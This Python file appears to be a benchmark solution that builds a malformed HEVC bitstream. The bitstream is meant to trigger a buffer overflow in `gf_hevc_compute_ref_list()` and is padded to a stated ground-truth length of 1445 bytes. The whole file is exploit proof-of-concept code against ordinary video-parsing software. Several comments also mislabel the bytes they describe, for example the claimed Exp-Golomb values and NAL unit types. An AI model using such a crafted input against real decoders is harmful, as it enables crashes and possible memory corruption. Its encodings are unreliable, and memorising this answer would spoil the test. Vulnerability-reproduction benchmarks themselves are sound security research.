import struct
import subprocess
import tempfile
import os
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal HEVC bitstream that will trigger the vulnerability
        # Based on the vulnerability in gf_hevc_compute_ref_list()
        # We need to create a malformed HEVC stream that causes buffer overflow
        
        # Build the PoC to match the ground-truth length of 1445 bytes
        # We'll create a structured byte sequence that triggers the overflow
        
        poc = bytearray()
        
        # Start with HEVC start code
        poc.extend(b'\x00\x00\x00\x01')
        
        # Add NAL unit header for VPS (Video Parameter Set)
        # nal_unit_type = 32 (VPS), layer_id = 0, temporal_id = 0
        poc.extend(b'\x40\x01')
        
        # Add some VPS data - minimal valid data
        poc.extend(b'\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\x90\x00\x00\x03\x00\x00')
        poc.extend(b'\x03\x00\x99\x08\x40')
        
        # Add another start code for SPS
        poc.extend(b'\x00\x00\x00\x01')
        
        # NAL unit header for SPS (Sequence Parameter Set)
        # nal_unit_type = 33 (SPS), layer_id = 0, temporal_id = 0
        poc.extend(b'\x42\x01')
        
        # SPS data - crafted to trigger the vulnerability
        # We need to create parameters that will cause insufficient bounds checking
        # in gf_hevc_compute_ref_list()
        
        # Start with valid SPS structure but with manipulated reference parameters
        sps_data = bytearray()
        
        # video_parameter_set_id, max_sub_layers_minus1, temporal_id_nesting_flag
        sps_data.extend(b'\x01\x01')
        
        # profile_tier_level - minimal
        sps_data.extend(b'\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        
        # sps_seq_parameter_set_id
        sps_data.append(0)  # ue(v)
        
        # chroma_format_idc, separate_colour_plane_flag
        sps_data.append(0)  # ue(v)
        
        # pic_width_in_luma_samples
        sps_data.extend(b'\x80\x10')  # ue(v) = 16 (encoded as 0x21 in exp-golomb)
        
        # pic_height_in_luma_samples
        sps_data.extend(b'\x80\x10')  # ue(v) = 16
        
        # conformance_window_flag = 0
        sps_data.append(0)
        
        # bit_depth_luma_minus8, bit_depth_chroma_minus8
        sps_data.append(0)  # ue(v)
        
        # log2_max_pic_order_cnt_lsb_minus4
        sps_data.append(0)  # ue(v)
        
        # sps_sub_layer_ordering_info_present_flag = 0
        sps_data.append(0)
        
        # max_dec_pic_buffering_minus1, max_num_reorder_pics, max_latency_increase_plus1
        # Set to large value to trigger overflow
        sps_data.extend(b'\xff\xff\xff\xff')  # ue(v) with large value
        
        # log2_min_luma_coding_block_size_minus3
        sps_data.append(0)  # ue(v)
        
        # log2_diff_max_min_luma_coding_block_size
        sps_data.append(0)  # ue(v)
        
        # log2_min_transform_block_size_minus2
        sps_data.append(0)  # ue(v)
        
        # log2_diff_max_min_transform_block_size
        sps_data.append(0)  # ue(v)
        
        # max_transform_hierarchy_depth_inter, max_transform_hierarchy_depth_intra
        sps_data.extend(b'\x00\x00')  # ue(v)
        
        # scaling_list_enabled_flag = 0
        sps_data.append(0)
        
        # amp_enabled_flag, sample_adaptive_offset_enabled_flag = 0
        sps_data.append(0)
        
        # pcm_enabled_flag = 0
        sps_data.append(0)
        
        # num_short_term_ref_pic_sets - set to large value
        # This is critical for triggering the buffer overflow
        sps_data.extend(b'\xff\xff')  # ue(v) with very large value
        
        # Now add malicious short_term_ref_pic_sets data
        # We'll create many reference picture sets to overflow the buffer
        
        # First short_term_ref_pic_set
        # inter_ref_pic_set_prediction_flag = 0
        sps_data.append(0)
        
        # num_negative_pics - set to large value
        sps_data.extend(b'\xff\xff')  # ue(v) with large value
        
        # delta_poc_s0_minus1 and used_by_curr_pic_s0_flag for each negative pic
        # We'll add many entries to cause overflow
        for i in range(100):
            sps_data.extend(b'\x00\x01')  # delta_poc_s0_minus1 = 0, used_by_curr_pic_s0_flag = 1
        
        # num_positive_pics - set to large value
        sps_data.extend(b'\xff\xff')  # ue(v) with large value
        
        # delta_poc_s1_minus1 and used_by_curr_pic_s1_flag for each positive pic
        for i in range(100):
            sps_data.extend(b'\x00\x01')  # delta_poc_s1_minus1 = 0, used_by_curr_pic_s1_flag = 1
        
        # long_term_ref_pics_present_flag = 0
        sps_data.append(0)
        
        # sps_temporal_mvp_enabled_flag, strong_intra_smoothing_enabled_flag = 0
        sps_data.append(0)
        
        poc.extend(sps_data)
        
        # Add another start code for PPS
        poc.extend(b'\x00\x00\x00\x01')
        
        # NAL unit header for PPS (Picture Parameter Set)
        # nal_unit_type = 34 (PPS), layer_id = 0, temporal_id = 0
        poc.extend(b'\x44\x01')
        
        # PPS data - minimal
        pps_data = bytearray()
        pps_data.extend(b'\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01')
        poc.extend(pps_data)
        
        # Add slice data to trigger the vulnerable function
        poc.extend(b'\x00\x00\x00\x01')
        
        # NAL unit header for slice
        # nal_unit_type = 1 (CRA), layer_id = 0, temporal_id = 0
        poc.extend(b'\x26\x01')
        
        # Slice header with malicious parameters
        slice_data = bytearray()
        
        # first_slice_segment_in_pic_flag = 1
        slice_data.append(0x80)
        
        # no_output_of_prior_pics_flag = 0
        # slice_pic_parameter_set_id = 0
        slice_data.append(0x00)
        
        # slice_type = P
        slice_data.extend(b'\x40')  # ue(v) = 0 for P slice
        
        # pic_output_flag = 1
        # colour_plane_id = 0
        # slice_pic_order_cnt_lsb = 0
        slice_data.extend(b'\x00\x00')
        
        # short_term_ref_pic_set_sps_flag = 0
        # We'll use our own short_term_ref_pic_set to trigger overflow
        
        # Create a malformed short_term_ref_pic_set in slice header
        # inter_ref_pic_set_prediction_flag = 0
        slice_data.append(0)
        
        # num_negative_pics - set to extremely large value to cause overflow
        slice_data.extend(b'\xff\xff\xff\xff')  # ue(v) with maximum value
        
        # Add many delta_poc_s0_minus1 and used_by_curr_pic_s0_flag pairs
        # This will cause buffer overflow when processing reference list
        for i in range(200):
            slice_data.extend(b'\x00\x01')  # delta_poc_s0_minus1 = 0, used_by_curr_pic_s0_flag = 1
        
        # num_positive_pics - also large
        slice_data.extend(b'\xff\xff\xff\xff')
        
        for i in range(200):
            slice_data.extend(b'\x00\x01')  # delta_poc_s1_minus1 = 0, used_by_curr_pic_s1_flag = 1
        
        poc.extend(slice_data)
        
        # Pad to exactly 1445 bytes to match ground-truth
        current_len = len(poc)
        if current_len < 1445:
            poc.extend(b'\x00' * (1445 - current_len))
        elif current_len > 1445:
            poc = poc[:1445]
        
        return bytes(poc)
